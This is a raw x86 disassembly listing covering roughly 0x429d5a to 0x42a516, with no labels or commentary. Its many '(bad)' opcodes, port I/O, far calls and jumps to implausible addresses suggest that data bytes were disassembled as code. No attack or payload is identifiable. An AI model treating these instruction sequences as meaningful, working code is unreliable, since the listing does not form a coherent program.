  429d5a:	mov    eax,esp
  429d5c:	call   0xb900:0x8b005587
  429d63:	inc    ebp
  429d64:	push   ebp
  429d65:	lea    ecx,[ebp-0x27ff4f12]
  429d6b:	mov    eax,edi
  429d6d:	int3   
  429d6e:	push   ebp
  429d6f:	xchg   edi,eax
  429d71:	add    esp,ebp
  429d73:	add    BYTE PTR [eax],al
  429d75:	inc    ebp
  429d76:	add    BYTE PTR [ebp+0x8b3255],cl
  429d7c:	cld    
  429d7d:	mov    DWORD PTR [edx],edi
  429d7f:	aam    0x75
  429d81:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d87:	mov    DWORD PTR [ebx-0x50],edx
  429d8a:	test   BYTE PTR [ebp-0x1],0xe8
  429d8e:	mov    eax,DWORD PTR [eax]
  429d90:	hlt    
  429d91:	add    al,al
  429d93:	mov    eax,DWORD PTR ds:0x890045a8
  429d99:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d9f:	inc    DWORD PTR [eax*2+0xf75854d]
  429da6:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429dac:	call   0x7298faed
  429db1:	je     0x429e11
  429db3:	js     0x429e14
  429db5:	lock ret 0x7e
  429db9:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429dbf:	mov    edi,edi
  429dc1:	sbb    al,bl
  429dc3:	clc    
  429dc4:	add    BYTE PTR [ebp-0x73],bh
  429dc7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dcd:	ror    BYTE PTR [eax],1
  429dcf:	dec    ebp
  429dd0:	xchg   ebp,eax
  429dd1:	mov    edi,edi
  429dd3:	in     al,0x8b
  429dd5:	jge    0x429d60
  429dd7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429ddd:	clc    
  429dde:	pop    esi
  429ddf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429de5:	clc    
  429de6:	add    al,0x6e
  429de8:	mov    eax,DWORD PTR [ebx]
  429dea:	mov    BYTE PTR [ebp+0x0],dl
  429ded:	mov    edx,DWORD PTR [ebx-0x20]
  429df0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429df6:	add    eax,0x3b3a73
  429dfb:	adc    al,0x89
  429dfd:	pop    eax
  429dfe:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429e02:	ret    0xf08
  429e05:	cmp    al,0x2
  429e07:	mov    DWORD PTR [edx],esi
  429e09:	cld    
  429e0a:	add    BYTE PTR [ebp+0x66],dl
  429e0d:	add    eax,ebx
  429e0f:	add    esp,eax
  429e11:	sub    eax,eax
  429e13:	or     BYTE PTR [ecx-0x77f474bb],cl
  429e19:	add    BYTE PTR [eax],al
  429e1b:	mov    DWORD PTR [ebx-0x24],ebx
  429e1e:	push   edi
  429e1f:	push   ebp
  429e20:	clc    
  429e21:	add    DWORD PTR [esi+0x1b0100],0x45
  429e28:	out    0xff,eax
  429e2a:	add    edx,DWORD PTR [eax]
  429e2c:	jmp    0x429e16
  429e2e:	cmp    ch,0x43
  429e31:	(bad)  
  429e32:	jmp    0x40c82684
  429e37:	je     0x429dc3
  429e39:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e3f:	inc    ebp
  429e40:	add    BYTE PTR [ebx-0x770375],al
  429e46:	add    ah,ch
  429e48:	add    edx,esp
  429e4a:	pop    edi
  429e4b:	pop    ebp
  429e4c:	push   ebp
  429e4d:	inc    ebx
  429e4e:	in     al,dx
  429e4f:	pop    ebp
  429e50:	in     al,dx
  429e51:	cmp    edx,DWORD PTR [edi-0x8]
  429e54:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e5b:	add    al,0x47
  429e5d:	push   ebp
  429e5e:	mov    esp,ebp
  429e60:	in     al,0x45
  429e62:	dec    ebp
  429e63:	push   esi
  429e64:	test   DWORD PTR [eax+0xff010f],esi
  429e6a:	add    BYTE PTR [eax+0xc018b],dh
  429e70:	leave  
  429e71:	inc    ebp
  429e72:	test   al,ch
  429e74:	add    dh,bh
  429e76:	add    bh,bh
  429e78:	dec    ebp
  429e79:	push   cs
  429e7a:	mov    DWORD PTR [ecx],eax
  429e7c:	hlt    
  429e7d:	push   es
  429e7e:	dec    ebp
  429e7f:	leave  
  429e80:	mov    DWORD PTR [eax],ecx
  429e82:	clc    
  429e83:	cmovge eax,ecx
  429e86:	mov    ecx,0x85c2f0
  429e8c:	clc    
  429e8d:	pop    DWORD PTR [ebp+0x1]
  429e90:	aas    
  429e91:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e98:	push   esi
  429e99:	add    BYTE PTR [ebp-0x4],al
  429e9c:	mov    DWORD PTR [eax],eax
  429e9e:	cld    
  429e9f:	inc    bp
  429ea1:	add    DWORD PTR [edx],edi
  429ea3:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429eab:	mov    ebx,0xcd4f68
  429eb0:	mov    edi,DWORD PTR [ebx]
  429eb2:	or     al,0x75
  429eb4:	(bad)  
  429eb5:	xor    ecx,ebx
  429eb7:	enterw 0x4d01,0x87
  429ebc:	jmp    0x429ec2
  429ec1:	ret    
  429ec2:	inc    ebp
  429ec3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ec9:	add    dh,cl
  429ecb:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429ed3:	icebp  
  429ed4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eda:	inc    ebp
  429edb:	inc    edx
  429edc:	mov    ecx,DWORD PTR [edx]
  429ede:	or     al,0xf9
  429ee0:	(bad)  
  429ee1:	jne    0x429eb1
  429ee3:	mov    cl,0x0
  429ee6:	rol    BYTE PTR [esi+0x450134],1
  429eec:	add    eax,edi
  429eee:	cld    
  429eef:	ret    
  429ef0:	dec    ebp
  429ef1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ef7:	mov    edi,0xf82c8534
  429efc:	jmp    0x429f7b
  429efe:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429f04:	mov    dl,0x8b
  429f06:	sub    cl,BYTE PTR [eax]
  429f08:	mov    ecx,ecx
  429f0a:	in     al,dx
  429f0b:	test   cl,dh
  429f0d:	add    BYTE PTR [edx],al
  429f0f:	add    BYTE PTR [eax-0x377a97b3],al
  429f15:	cmovge esi,esp
  429f18:	add    eax,DWORD PTR [eax]
  429f1a:	cld    
  429f1b:	mov    eax,DWORD PTR [ecx]
  429f1d:	adc    BYTE PTR [ebp+0x4d],cl
  429f20:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f26:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f2c:	cmp    esp,ebx
  429f2e:	jne    0x429ecc
  429f30:	mov    eax,edi
  429f32:	adc    ah,ch
  429f34:	push   ebp
  429f35:	test   DWORD PTR [ebx],esi
  429f37:	clc    
  429f38:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f3e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f41:	dec    ebp
  429f42:	adc    bh,al
  429f44:	push   0x8b85ff10
  429f49:	clc    
  429f4a:	or     al,0x50
  429f4c:	(bad)  
  429f4d:	push   ecx
  429f4e:	retf   
  429f4f:	mov    ebx,0xff4d8dc8
  429f54:	mov    DWORD PTR [ebp+0x8],eax
  429f57:	xor    eax,DWORD PTR [ebp-0x75]
  429f5a:	cmp    ebp,DWORD PTR [ebx]
  429f5c:	lsl    ebx,WORD PTR [edi-0x8]
  429f60:	call   DWORD PTR [ebx-0x741bff75]
  429f66:	(bad)  
  429f67:	or     al,0x5b
  429f69:	dec    ebp
  429f6a:	or     BYTE PTR [ebx],dh
  429f6c:	inc    ebp
  429f6d:	xor    esi,DWORD PTR ds:0x708088d
  429f73:	in     eax,0x98
  429f75:	add    BYTE PTR [edx],dh
  429f77:	inc    ebp
  429f78:	pop    edi
  429f79:	xor    eax,edx
  429f7b:	test   DWORD PTR [eax],0x81108b8b
  429f81:	dec    ebp
  429f82:	sub    al,0x33
  429f84:	add    BYTE PTR [ebx],dh
  429f86:	push   esi
  429f87:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f8d:	mov    edi,eax
  429f8f:	or     BYTE PTR [ebp+0x45],al
  429f92:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f98:	cmp    cl,cl
  429f9a:	pushf  
  429f9b:	push   es
  429f9c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429fa3:	dec    ebp
  429fa4:	inc    ebp
  429fa5:	and    BYTE PTR [eax],0x50
  429fa8:	pushf  
  429fa9:	push   0x4de4d1c7
  429fae:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429fb4:	fsubr  st,st(1)
  429fb6:	xlat   BYTE PTR ds:[ebx]
  429fb7:	rol    bh,cl
  429fb9:	mov    edx,esp
  429fbb:	or     BYTE PTR [ebp+0x4588f84d],al
  429fc1:	mov    ecx,DWORD PTR [eax]
  429fc3:	or     BYTE PTR [eax],al
  429fc5:	push   ebp
  429fc6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fcc:	dec    ebp
  429fcd:	enter  0xceba,0x8
  429fd1:	retf   0x1807
  429fd4:	ret    0x984d
  429fd7:	mov    esi,DWORD PTR [edx]
  429fd9:	or     al,0x33
  429fdb:	into   
  429fdc:	add    edx,esi
  429fde:	add    ecx,edx
  429fe0:	bswap  eax
  429fe2:	ror    esi,0x98
  429fe5:	dec    ebp
  429fe6:	add    cl,ch
  429fe8:	mov    edi,edi
  429fea:	hlt    
  429feb:	inc    esi
  429fed:	inc    ebp
  429fee:	ret    0x4533
  429ff1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429ff7:	or     BYTE PTR [ebx],dh
  429ff9:	dec    ebp
  429ffa:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  42a000:	jne    0xff8c9fc7
  42a006:	inc    ebp
  42a007:	inc    ebp
  42a008:	mov    esi,DWORD PTR [ebx]
  42a00a:	clc    
  42a00b:	pop    esi
  42a00c:	ret    0xcaeb
  42a00f:	mov    eax,esi
  42a011:	call   0x5203f0e4
  42a016:	dec    ebp
  42a017:	add    eax,0xf8728b
  42a01c:	adc    eax,0xce0ccac9
  42a021:	push   ebp
  42a022:	ret    0xc6ec
  42a025:	in     al,dx
  42a026:	call   0x3342ed2f
  42a02b:	push   edi
  42a02c:	add    edi,eax
  42a02e:	xor    eax,eax
  42a030:	jmp    0x42a077
  42a032:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a038:	add    eax,edi
  42a03a:	shr    eax,cl
  42a03c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a042:	mov    edi,DWORD PTR [ecx]
  42a044:	in     al,dx
  42a045:	pushf  
  42a046:	ret    0x84c7
  42a049:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a04f:	inc    ebp
  42a050:	in     al,dx
  42a051:	cmp    BYTE PTR [ebp-0x64],al
  42a054:	mov    eax,edi
  42a056:	cld    
  42a057:	fmul   st(2),st
  42a059:	sbb    dl,al
  42a05b:	jmp    0x9c3b:0x374d45c1
  42a062:	jbe    0x42a02b
  42a064:	mov    esp,eax
  42a066:	clc    
  42a067:	add    BYTE PTR [ebp+0x0],cl
  42a06a:	mov    ecx,ecx
  42a06c:	lea    eax,[ebp-0x5]
  42a06f:	mov    edi,edi
  42a071:	call   0x51cdf0bb
  42a076:	hlt    
  42a077:	xor    eax,edx
  42a079:	mov    esi,0x987284
  42a07e:	xor    cl,dl
  42a080:	mov    esi,eax
  42a082:	hlt    
  42a083:	into   
  42a084:	inc    ebp
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	mov    ebp,ecx
  42a088:	cld    
  42a089:	add    dl,cl
  42a08b:	add    dl,al
  42a08d:	inc    ebp
  42a08e:	shr    DWORD PTR [ebx],0x4d
  42a091:	xor    edi,DWORD PTR [ebx]
  42a093:	mov    DWORD PTR [edi],ecx
  42a095:	clc    
  42a096:	dec    esi
  42a097:	inc    ebp
  42a098:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a09e:	ret    0xc6ca
  42a0a1:	mov    BYTE PTR [ebp-0x32],0x53
  42a0a5:	scas   eax,DWORD PTR es:[edi]
  42a0a6:	inc    ebp
  42a0a7:	jmp    0x42a0e0
  42a0a9:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a0b0:	pop    ebx
  42a0b1:	xor    ecx,DWORD PTR [ebp+0x3]
  42a0b4:	mov    eax,DWORD PTR [ebx]
  42a0b6:	clc    
  42a0b7:	test   edx,ecx
  42a0b9:	mov    ecx,esi
  42a0bb:	cld    
  42a0bc:	call   0x8ab6e606
  42a0c1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0c7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0cd:	fdiv   QWORD PTR [ebx]
  42a0cf:	retf   0xce89
  42a0d2:	in     al,0xc1
  42a0d4:	inc    ebp
  42a0d5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0db:	into   
  42a0dc:	mov    dh,0xc1
  42a0df:	call   0x8c16e668
  42a0e4:	(bad)  
  42a0e5:	cld    
  42a0e6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0e9:	xor    eax,ecx
  42a0eb:	lea    eax,[ebp+0x8]
  42a0ee:	mov    esi,DWORD PTR [edx-0x4]
  42a0f1:	add    dl,al
  42a0f3:	inc    ebp
  42a0f4:	mov    esp,0x32d8988b
  42a0f9:	dec    ebp
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	cld    
  42a0fd:	xor    eax,edx
  42a0ff:	sub    ebp,DWORD PTR [eax-0x75]
  42a102:	int    0xec
  42a104:	sub    ecx,eax
  42a106:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a10c:	mov    esi,esp
  42a10e:	call   0x3416ee97
  42a113:	inc    DWORD PTR [ebx]
  42a115:	mov    edi,DWORD PTR [ebx]
  42a117:	cld    
  42a118:	jne    0x42a167
  42a11a:	mov    esi,DWORD PTR [ebx]
  42a11c:	aam    0x8d
  42a11e:	dec    ebp
  42a11f:	or     BYTE PTR [ebx],dh
  42a121:	jb     0x42a126
  42a123:	add    BYTE PTR [edi+0x45],bl
  42a126:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a12d:	xor    ebp,esp
  42a12f:	xor    eax,edi
  42a131:	sub    edi,esp
  42a133:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a139:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a140:	inc    ebp
  42a141:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a147:	clc    
  42a148:	mov    eax,edi
  42a14a:	nop
  42a14b:	fadd   QWORD PTR [eax]
  42a14d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a153:	jmp    0x42a0de
  42a155:	mov    eax,DWORD PTR [ecx]
  42a157:	fadd   DWORD PTR [eax]
  42a159:	inc    ebp
  42a15a:	or     DWORD PTR [ebx],esi
  42a15c:	dec    eax
  42a15d:	add    edx,DWORD PTR [ebx-0x2d]
  42a160:	dec    ebp
  42a161:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a167:	inc    ebp
  42a168:	push   eax
  42a169:	mov    dl,BYTE PTR [ecx-0xd]
  42a16c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a16f:	(bad)  
  42a171:	rol    BYTE PTR [eax],0xc1
  42a174:	ret    
  42a175:	inc    ebp
  42a176:	inc    ebp
  42a177:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a17d:	xor    eax,ebx
  42a17f:	add    eax,DWORD PTR [ebp+0x23]
  42a182:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a188:	cmp    edi,0xc
  42a18b:	dec    ebp
  42a18c:	inc    ebp
  42a18d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a193:	inc    ebp
  42a194:	mov    esi,DWORD PTR [ebx]
  42a196:	clc    
  42a197:	lea    eax,[ebp+0x45725407]
  42a19d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a1a1:	xor    edi,DWORD PTR [eax]
  42a1a3:	mov    ecx,0xff8b8d4d
  42a1a8:	push   esp
  42a1a9:	enter  0x4df7,0x23
  42a1ad:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a1b3:	mov    eax,DWORD PTR [ebx]
  42a1b5:	loopne 0x42a1a2
  42a1b7:	ret    0xc68b
  42a1ba:	push   esp
  42a1bb:	enter  0x9745,0x8b
  42a1bf:	inc    ebp
  42a1c0:	cld    
  42a1c1:	mov    eax,edi
  42a1c3:	clc    
  42a1c4:	ret    
  42a1c5:	ret    0xc645
  42a1c8:	mov    esi,DWORD PTR [ebx]
  42a1ca:	cld    
  42a1cb:	pop    esi
  42a1cc:	mov    ebx,0x83458bc3
  42a1d2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1d6:	dec    ebp
  42a1d7:	cmp    BYTE PTR [ebx],dh
  42a1d9:	pushf  
  42a1da:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1e0:	fcom   DWORD PTR [ebp+0x45]
  42a1e3:	mov    edi,DWORD PTR [edx]
  42a1e5:	adc    al,0x9c
  42a1e7:	inc    ebp
  42a1e8:	(bad)  
  42a1e9:	mov    ebx,eax
  42a1eb:	adc    al,0x85
  42a1ed:	cmp    al,0x1
  42a1f0:	inc    ebp
  42a1f1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1f8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1fe:	xor    eax,DWORD PTR [ebx]
  42a200:	add    edi,DWORD PTR [ecx+ecx*4]
  42a203:	mov    esp,esi
  42a205:	clc    
  42a206:	inc    ebp
  42a207:	inc    ebp
  42a208:	add    edx,DWORD PTR [esi+0xc]
  42a20b:	mov    edi,0x7ff0845
  42a210:	in     al,dx
  42a211:	(bad)  
  42a212:	jne    0x42a1ac
  42a214:	mov    esi,DWORD PTR [edx]
  42a216:	clc    
  42a217:	add    ebp,DWORD PTR [edx]
  42a219:	mov    edi,edi
  42a21b:	in     al,dx
  42a21c:	mov    DWORD PTR [ebp-0x10],eax
  42a21f:	xor    eax,DWORD PTR [ebp+0x3]
  42a222:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a228:	fmul   DWORD PTR [ebx-0x173caf39]
  42a22e:	lea    ecx,[ecx+0x45e8d4bc]
  42a234:	clc    
  42a235:	mov    edi,edi
  42a237:	cmp    BYTE PTR [ebp+0x4d],al
  42a23a:	test   DWORD PTR [eax+0x74],ecx
  42a23d:	inc    ecx
  42a23e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a244:	ret    
  42a245:	inc    eax
  42a246:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a24c:	push   eax
  42a24d:	dec    eax
  42a24e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a24f:	sar    bh,1
  42a251:	enter  0x458b,0xec
  42a255:	mov    eax,DWORD PTR [ebp+0x38]
  42a258:	mov    eax,ecx
  42a25a:	fadd   DWORD PTR [ebx]
  42a25c:	dec    ebp
  42a25d:	inc    eax
  42a25e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a264:	inc    ebp
  42a265:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a26b:	fadd   QWORD PTR [ebx]
  42a26d:	inc    ebp
  42a26e:	or     al,0x33
  42a270:	dec    ebp
  42a271:	add    edi,DWORD PTR [ebx]
  42a273:	mov    DWORD PTR [edx-0x28],esi
  42a276:	mov    eax,DWORD PTR [ebp-0x10]
  42a279:	mov    eax,DWORD PTR [eax+0x10]
  42a27c:	mov    eax,edi
  42a27e:	lock ret 
  42a280:	inc    ecx
  42a281:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a287:	fsubr  st,st(5)
  42a289:	test   DWORD PTR [eax],eax
  42a28b:	clc    
  42a28c:	push   0x45
  42a28e:	(bad)  
  42a28f:	cmp    ebp,esp
  42a291:	pushf  
  42a292:	inc    ebp
  42a293:	(bad)  
  42a294:	push   eax
  42a295:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a299:	clc    
  42a29a:	mov    eax,0xf8008584
  42a29f:	mov    eax,DWORD PTR [ebp-0x4]
  42a2a2:	mov    edi,0x4585c3cc
  42a2a8:	clc    
  42a2a9:	mov    eax,DWORD PTR [ebp+0x14]
  42a2ac:	cmp    al,BYTE PTR [ebp-0x64]
  42a2af:	mov    edi,eax
  42a2b1:	in     al,dx
  42a2b2:	les    esi,FWORD PTR [ebp-0x7b]
  42a2b5:	mov    edi,eax
  42a2b7:	or     al,0x4d
  42a2b9:	dec    ebp
  42a2ba:	mov    eax,ebp
  42a2bc:	in     al,0xf2
  42a2be:	dec    ebp
  42a2bf:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2c5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2cb:	inc    ebp
  42a2cc:	mov    DWORD PTR [ebx],esi
  42a2ce:	fadd   QWORD PTR [ebx]
  42a2d0:	dec    ebp
  42a2d1:	push   eax
  42a2d2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2d5:	push   eax
  42a2d6:	mov    DWORD PTR [eax],ebx
  42a2d8:	fdivr  st,st(7)
  42a2da:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2e1:	dec    esi
  42a2e2:	clc    
  42a2e3:	inc    ebp
  42a2e4:	test   BYTE PTR [ebx],dh
  42a2e6:	add    DWORD PTR [ebx],eax
  42a2e8:	add    BYTE PTR [eax+0x4d],dl
  42a2eb:	jne    0x42a320
  42a2ed:	lea    ecx,[ebx-0x7617fc44]
  42a2f3:	div    ah
  42a2f5:	inc    DWORD PTR [ebp+0x45]
  42a2f8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2fe:	jb     0x42a28b
  42a300:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a307:	mov    ecx,DWORD PTR [ebp-0x10]
  42a30a:	xor    ecx,DWORD PTR [ebp+0x3]
  42a30d:	mov    edi,DWORD PTR [ebx]
  42a30f:	adc    BYTE PTR [ebp+0x41],dh
  42a312:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a318:	ret    
  42a319:	push   ss
  42a31a:	push   0x45
  42a31c:	lea    ecx,[ebx+0x4de80cb0]
  42a322:	sti    
  42a323:	add    edi,edi
  42a325:	or     BYTE PTR [ebp+0x4d],al
  42a328:	mov    ebp,DWORD PTR [ebx]
  42a32a:	xor    ebp,ecx
  42a32c:	mov    al,BYTE PTR [edx]
  42a32e:	add    eax,0xc7200
  42a333:	jne    0x42a382
  42a335:	lea    esi,[ebx]
  42a337:	mov    al,0xf
  42a339:	call   0xe99fe
  42a33e:	sar    DWORD PTR [eax],0x84
  42a341:	pushf  
  42a342:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a348:	mov    edi,DWORD PTR [ecx]
  42a34a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a351:	test   DWORD PTR [eax],eax
  42a353:	clc    
  42a354:	dec    ebp
  42a355:	inc    ebp
  42a356:	xor    edi,DWORD PTR [ebx]
  42a358:	setl   al
  42a35b:	(bad)  
  42a35c:	retf   
  42a35d:	rol    cl,1
  42a35f:	dec    ebp
  42a360:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a366:	inc    ebp
  42a367:	lea    ecx,[ebx-0x75b2cc38]
  42a36d:	lea    eax,ds:0x4d72c4
  42a373:	mov    ecx,DWORD PTR [ebp-0x4]
  42a376:	xor    ecx,edi
  42a378:	bswap  ebx
  42a37a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a37e:	rol    DWORD PTR [ecx],0x84
  42a381:	add    BYTE PTR [ecx],al
  42a383:	cmp    al,BYTE PTR [eax]
  42a385:	pushf  
  42a386:	inc    ebp
  42a387:	jnp    0x8a42d78a
  42a38d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a393:	lock dec ebp
  42a395:	retf   
  42a396:	xor    ecx,DWORD PTR [ebp+0xf]
  42a399:	mov    eax,eax
  42a39b:	fmul   st,st(3)
  42a39d:	test   ecx,0x1988484
  42a3a3:	xor    al,BYTE PTR [eax]
  42a3a5:	mov    DWORD PTR [ebp-0x28],eax
  42a3a8:	mov    eax,DWORD PTR [ebp+0x33]
  42a3ab:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a3b1:	ret    
  42a3b2:	add    al,cl
  42a3b4:	dec    ebp
  42a3b5:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a3bb:	add    ecx,DWORD PTR ds:0xc7250
  42a3c1:	inc    ebp
  42a3c2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3c6:	mov    edi,edi
  42a3c8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ce:	jb     0x42a397
  42a3d0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3d7:	mov    esi,DWORD PTR [ebx]
  42a3d9:	cld    
  42a3da:	mov    cl,bh
  42a3dc:	or     eax,0x372b6
  42a3e1:	cmp    ecx,eax
  42a3e3:	jne    0x42a460
  42a3e9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3ec:	mov    eax,DWORD PTR [eax]
  42a3ee:	xor    eax,edi
  42a3f0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi-0x3f],dl
  42a407:	add    BYTE PTR [ebp-0x75],cl
  42a40a:	mov    esi,eax
  42a40c:	xor    eax,DWORD PTR [eax]
  42a40e:	mov    al,bh
  42a410:	or     eax,0x487284
  42a415:	xor    al,cl
  42a417:	mov    ecx,DWORD PTR [ebp-0x4]
  42a41a:	mov    ecx,edi
  42a41c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a422:	jb     0x42a433
  42a424:	add    BYTE PTR [edi],dh
  42a426:	enter  0x8500,0x8b
  42a42a:	add    ah,bl
  42a42c:	add    BYTE PTR [eax],al
  42a42e:	inc    ebp
  42a42f:	(bad)  
  42a430:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a437:	mov    esi,DWORD PTR [edx-0x4]
  42a43a:	add    bh,cl
  42a43c:	dec    ebp
  42a43d:	mov    dh,0x8b
  42a43f:	add    esi,DWORD PTR [ebx]
  42a441:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a447:	add    BYTE PTR [eax],al
  42a449:	mov    eax,ecx
  42a44b:	loopne 0x42a49a
  42a44d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a453:	dec    eax
  42a454:	or     eax,0x8b7232
  42a459:	in     al,0xc1
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a465:	xor    dh,BYTE PTR [edx-0x75]
  42a468:	add    al,dh
  42a46a:	enter  0x4f09,0xcf
  42a46e:	inc    ebp
  42a46f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a475:	or     al,BYTE PTR ds:0xe4728b
  42a47b:	or     DWORD PTR [ebp-0x31],ecx
  42a47e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a485:	cmp    dh,BYTE PTR [edx+0xf]
  42a488:	add    bl,dl
  42a48a:	rol    DWORD PTR [eax],0x4d
  42a48d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a493:	(bad)  
  42a494:	or     eax,0x487284
  42a499:	xor    al,cl
  42a49b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a49e:	mov    ecx,DWORD PTR [ecx]
  42a4a0:	xor    ecx,edi
  42a4a2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a4a9:	xor    cl,al
  42a4ab:	mov    ecx,DWORD PTR [edi]
  42a4ad:	fadd   QWORD PTR [ebp+0x9]
  42a4b0:	call   0xffcf9f84
  42a4b5:	dec    eax
  42a4b6:	dec    ebp
  42a4b7:	xor    bh,BYTE PTR [ebx]
  42a4b9:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a4bd:	loopne 0x42a4bb
  42a4bf:	or     edi,eax
  42a4c1:	iret   
  42a4c2:	ret    
  42a4c3:	mov    WORD PTR [ebp+0x4c],es
  42a4c6:	mov    esi,DWORD PTR [edx]
  42a4c8:	call   0x84526c07
  42a4cd:	(bad)  
  42a4ce:	cwde   
  42a4cf:	add    BYTE PTR [edx],dh
  42a4d1:	mov    esi,DWORD PTR [ebx]
  42a4d3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4d9:	test   BYTE PTR [ebx],dh
  42a4db:	dec    eax
  42a4dc:	add    esi,DWORD PTR [edx]
  42a4de:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4e4:	dec    edi
  42a4e6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4ed:	xor    al,BYTE PTR [ebx]
  42a4ef:	mov    edi,DWORD PTR [ebx]
  42a4f1:	in     al,0x75
  42a4f3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4f9:	dec    eax
  42a4fa:	xor    esi,DWORD PTR [edx]
  42a4fc:	lea    ecx,[edx]
  42a4fe:	or     BYTE PTR [ebx+0x900f072],cl
  42a504:	ja     0x42a4d5
  42a506:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a50d:	cmp    ch,al
  42a50f:	jne    0x42a504
  42a511:	mov    edi,edi
  42a513:	fadd   QWORD PTR [ebp+0x0]
  42a516:	mov    eax,edi
